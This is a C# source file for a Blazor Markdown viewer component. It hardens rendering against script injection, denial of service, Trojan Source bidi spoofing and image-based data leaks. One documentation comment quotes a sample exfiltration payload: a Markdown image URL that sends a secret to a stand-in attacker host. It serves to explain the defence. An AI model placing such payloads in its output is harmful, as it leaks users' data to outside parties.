using System.Text.RegularExpressions;

namespace Bit.BlazorUI;

/// <summary>
/// BitMarkdownViewer is a native, SEO friendly Blazor component that renders Markdown
/// to HTML entirely in C#. There is no JavaScript interop and no third-party packages.
/// </summary>
/// <remarks>
/// <para>
/// By default the component understands only the basic CommonMark core. Richer flavors
/// (GitHub tables, strikethrough, task lists, autolinks, emoji, ...) are opt-in: supply
/// a <see cref="Pipeline"/> built with the desired extensions (for example
/// <see cref="BitMarkdownPipelines.GitHub"/>).
/// </para>
/// <para>
/// Parsing produces an AST which is walked with a <see cref="Microsoft.AspNetCore.Components.Rendering.RenderTreeBuilder"/>,
/// so the output is real DOM rather than an <c>innerHTML</c> blob. Raw HTML in the source
/// is treated as text and link / image URLs are sanitized, keeping the output safe from
/// script injection by default.
/// </para>
/// </remarks>
public partial class BitMarkdownViewer : BitComponentBase
{
    private BitMarkdownDocumentNode _document = new();
    private string? _parsedSource;
    private BitMarkdownPipeline? _parsedWith;
    private BitMarkdownViewerImageRendering _parsedImageRendering;
    private int _parsedMaxDepth;
    private int _parsedMaxLength;
    private bool _parsedStripBidi;



    [Inject] private NavigationManager _navigationManager { get; set; } = default!;



    /// <summary>
    /// The Markdown string value to render as html elements.
    /// </summary>
    [Parameter] public string? Markdown { get; set; }

    /// <summary>
    /// The processing pipeline (flavor set). Defaults to <see cref="BitMarkdownPipeline.Basic"/>,
    /// i.e. the basic CommonMark core with no extensions.
    /// </summary>
    [Parameter] public BitMarkdownPipeline? Pipeline { get; set; }

    /// <summary>
    /// Controls whether remote images are allowed to load, guarding against silent
    /// data-exfiltration via auto-fetched image URLs (for example
    /// <c>![x](https://attacker.com/leak?data=SECRET)</c>). Defaults to the safe
    /// <see cref="BitMarkdownViewerImageRendering.SameOrigin"/> policy, which blocks
    /// cross-origin images while still loading same-origin and relative ones; set it
    /// to <see cref="BitMarkdownViewerImageRendering.All"/> to opt back in to loading
    /// every remote image when the Markdown source is fully trusted, or to
    /// <see cref="BitMarkdownViewerImageRendering.None"/> for the strictest policy.
    /// </summary>
    [Parameter] public BitMarkdownViewerImageRendering ImageRendering { get; set; } = BitMarkdownViewerImageRendering.SameOrigin;

    /// <summary>
    /// The maximum block/inline nesting depth allowed while parsing. Content nested
    /// deeper than this is rendered as plain text instead of being parsed further.
    /// This is an always-on safeguard against denial-of-service via pathologically
    /// nested input (e.g. thousands of nested blockquotes or lists) that would
    /// otherwise overflow the stack. Defaults to 100; values &lt;= 0 fall back to the
    /// default. Legitimate documents never approach this limit.
    /// </summary>
    [Parameter] public int MaxNestingDepth { get; set; } = BitMarkdownParseOptions.DefaultMaxDepth;

    /// <summary>
    /// When greater than zero, the Markdown source is truncated to this many characters
    /// before parsing. Use it to bound the work done on untrusted input. Defaults to 0
    /// (no limit).
    /// </summary>
    [Parameter] public int MaxLength { get; set; }

    /// <summary>
    /// When <c>true</c>, Unicode bidirectional control characters are stripped from the
    /// source before parsing, neutralizing "Trojan Source" (CVE-2021-42574) spoofing
    /// where text is made to display in a different order than it is encoded. Recommended
    /// for untrusted or AI-generated Markdown. Defaults to <c>false</c> to preserve
    /// explicit right-to-left embedding in trusted content. Zero-width joiners used by
    /// emoji and complex scripts are never removed.
    /// </summary>
    [Parameter] public bool StripBidiControlCharacters { get; set; }



    protected override string RootElementClass => "bit-mdv";

    private BitMarkdownPipeline EffectivePipeline => Pipeline ?? BitMarkdownPipeline.Basic;

    protected override void OnParametersSet()
    {
        var pipeline = EffectivePipeline;
        var maxDepth = MaxNestingDepth > 0 ? MaxNestingDepth : BitMarkdownParseOptions.DefaultMaxDepth;

        // Re-parse only when an input that affects the output changes.
        if (_parsedSource != Markdown ||
            ReferenceEquals(_parsedWith, pipeline) is false ||
            _parsedImageRendering != ImageRendering ||
            _parsedMaxDepth != maxDepth ||
            _parsedMaxLength != MaxLength ||
            _parsedStripBidi != StripBidiControlCharacters)
        {
            _document = ParseSafely(pipeline, maxDepth);
            ApplyImageRendering(_document.Children);
            _parsedSource = Markdown;
            _parsedWith = pipeline;
            _parsedImageRendering = ImageRendering;
            _parsedMaxDepth = maxDepth;
            _parsedMaxLength = MaxLength;
            _parsedStripBidi = StripBidiControlCharacters;
        }

        base.OnParametersSet();
    }

    /// <summary>
    /// Applies the input-hardening steps (bidi stripping, length cap) and parses with the
    /// configured depth limit, degrading gracefully to plain text if a parser regex hits
    /// its anti-ReDoS timeout.
    /// </summary>
    private BitMarkdownDocumentNode ParseSafely(BitMarkdownPipeline pipeline, int maxDepth)
    {
        var source = Markdown;

        if (StripBidiControlCharacters && !string.IsNullOrEmpty(source))
            source = BitMarkdownTextSanitizer.StripBidiControlCharacters(source);

        if (MaxLength > 0 && source is not null && source.Length > MaxLength)
            source = source[..MaxLength];

        var options = new BitMarkdownParseOptions { MaxDepth = maxDepth };

        try
        {
            return pipeline.Parse(source, options);
        }
        catch (RegexMatchTimeoutException)
        {
            // A parser regex hit its safety timeout on hostile input. Fall back to a
            // plain-text rendering of the source instead of surfacing the exception.
            var fallback = new BitMarkdownDocumentNode();
            var paragraph = new BitMarkdownParagraphNode();
            paragraph.Inlines.Add(new BitMarkdownTextNode(source ?? string.Empty));
            fallback.Children.Add(paragraph);
            return fallback;
        }
    }

    protected override void BuildRenderTree(RenderTreeBuilder builder)
    {
        var renderer = EffectivePipeline.CreateRenderer();

        builder.OpenElement(0, "div");

        builder.AddMultipleAttributes(1, HtmlAttributes);
        builder.AddAttribute(2, "id", _Id);
        builder.AddAttribute(3, "style", StyleBuilder.Value);
        builder.AddAttribute(4, "class", ClassBuilder.Value);
        if (Dir is not null)
        {
            builder.AddAttribute(5, "dir", Dir.Value.ToString().ToLower());
        }
        builder.AddElementReferenceCapture(6, v => RootElement = v);

        renderer.WriteNodes(builder, _document.Children);

        builder.CloseElement();
    }

    /// <summary>
    /// Walks the parsed AST and strips the source from any image that the active
    /// <see cref="ImageRendering"/> policy disallows, so the browser never issues the
    /// underlying request. The alt text is preserved for accessibility.
    /// </summary>
    private void ApplyImageRendering(IList<BitMarkdownNode> nodes)
    {
        if (ImageRendering == BitMarkdownViewerImageRendering.All)
            return;

        for (int i = 0; i < nodes.Count; i++)
        {
            var node = nodes[i];

            if (node is BitMarkdownImageNode img && ShouldBlockImage(img.Url))
            {
                // Url is init-only, so replace the node with a source-less copy.
                nodes[i] = new BitMarkdownImageNode
                {
                    Url = string.Empty,
                    Title = img.Title,
                    Alt = img.Alt
                };
                continue;
            }

            foreach (var childList in node.ChildLists)
            {
                ApplyImageRendering(childList);
            }
        }
    }

    private bool ShouldBlockImage(string url) => ImageRendering switch
    {
        BitMarkdownViewerImageRendering.None => true,
        BitMarkdownViewerImageRendering.SameOrigin => IsCrossOrigin(url),
        _ => false
    };

    // Cross-origin = a URL the browser would resolve to a different origin (scheme + host
    // + port) than the current page and fetch cross-site. Relative paths, anchors and
    // same-document references stay same-origin, and so do absolute URLs that point back
    // at the current origin; only those are kept under the SameOrigin policy. Absolute
    // http(s) URLs and protocol-relative ("//host/...") URLs are resolved against the
    // page's base URI before their origins are compared, so same-origin absolute URLs are
    // no longer blocked while genuinely cross-origin ones still are.
    private bool IsCrossOrigin(string url)
    {
        if (string.IsNullOrEmpty(url))
            return false;

        var isAbsolute = url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                         url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var isProtocolRelative = url.StartsWith("//", StringComparison.Ordinal);

        // Relative paths, fragments and same-document references never leave the origin.
        if (isAbsolute is false && isProtocolRelative is false)
            return false;

        // Resolve the image URL against the page's base URI and compare origins.
        if (Uri.TryCreate(_navigationManager.BaseUri, UriKind.Absolute, out var baseUri) &&
            Uri.TryCreate(baseUri, url, out var imageUri))
        {
            return string.Equals(baseUri.Scheme, imageUri.Scheme, StringComparison.OrdinalIgnoreCase) is false ||
                   string.Equals(baseUri.Host, imageUri.Host, StringComparison.OrdinalIgnoreCase) is false ||
                   baseUri.Port != imageUri.Port;
        }

        // If the origin can't be determined, err on the side of caution and block.
        return true;
    }
}
